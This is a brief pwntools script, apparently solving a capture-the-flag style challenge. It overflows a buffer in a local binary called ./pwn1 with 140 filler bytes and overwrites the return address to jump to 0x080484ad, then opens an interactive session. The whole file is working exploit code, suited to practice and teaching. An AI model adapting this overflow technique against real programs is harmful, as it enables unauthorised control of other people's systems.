from pwn import *
context.binary = "./pwn1"
p = process()
msg = b"A"*140+p32(0x080484ad)
p.sendline(msg)
p.interactive()
